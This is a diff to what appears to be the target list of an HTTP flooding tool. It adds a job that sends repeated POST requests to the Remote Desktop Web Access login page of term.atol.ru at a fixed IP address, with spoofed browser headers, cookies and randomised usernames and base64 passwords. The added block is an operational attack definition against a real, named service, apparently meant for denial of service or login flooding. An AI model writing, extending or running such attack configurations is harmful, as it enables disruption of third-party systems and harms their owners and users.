@@ -124,6 +124,36 @@
       "count": 53,
       "args": {
         "request": {
+          "method": "POST",
+          "path": "https://term.atol.ru/RDWeb/Pages/en-US/login.aspx",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Referer": "https://term.atol.ru/RDWeb/webclient/index.html",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://term.atol.ru",
+            "Connection": "keep-alive",
+            "Cookie": "TSWAFeatureCheckCookie=true; __lhash_=e37683575f17073e9af54448186161e4; MSFPC=GUID=f7ed8f67c918422b9917892e140eb1a5&HASH=f7ed&LV=202204&V=4&LU=1649184658688",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-origin",
+            "TE": "trailers"
+          },
+          "body": "DomainUserName=y{{random_int}}&UserPass={{random_payload_byte (random_int_n 10) | base64_encode}}"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.71.67.137:443",
+            "is_tls": false
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 53,
+      "args": {
+        "request": {
           "method": "GET",
           "path": "http://www.atol.ru"
         },
